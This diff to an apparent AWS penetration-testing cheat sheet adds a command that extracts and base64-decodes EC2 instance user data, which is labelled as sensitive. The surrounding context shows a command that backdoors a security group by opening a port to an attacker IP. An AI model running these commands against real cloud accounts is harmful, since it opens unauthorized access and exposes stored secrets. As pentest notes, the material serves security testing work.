@@ -61,3 +61,6 @@ https://github.com/Skyscanner/LambdaGuard
 
 ## Backdorin EC2 security groups
 aws ec2 authorize-security-group-ingress --group-id [security_grou_id] --protocol [tcp or udp] --port [port] --cidr [atacker_ip]
+
+## Extract sensitive User Data metadata in EC2
+aws ec2 describe-instance-attribute --attribute userData --region <REGION> --instance-id <INSTANCE_ID> --query UserData.Value --output text > encodeddata; base64 --decode encodeddata
